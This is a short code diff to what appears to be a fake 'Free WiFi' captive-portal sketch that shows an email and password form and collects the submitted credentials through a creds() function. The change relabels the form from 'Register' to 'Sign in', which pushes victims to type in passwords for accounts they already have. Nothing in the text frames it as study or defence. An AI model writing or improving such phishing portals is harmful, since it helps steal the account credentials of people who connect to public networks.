@@ -10,7 +10,7 @@
 // User configuration
 #define SSID_NAME "Free WiFi"
 #define SUBTITLE "Free WiFi service."
-#define TITLE "Register:"
+#define TITLE "Sign in:"
 #define BODY "Create an account to get connected to the internet."
 #define POST_TITLE "Validating..."
 #define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
@@ -61,7 +61,7 @@ String creds() {
 String index() {
   return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
     "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
-    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=Register></form></center>" + footer();
+    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
 }
 
 String posted() {
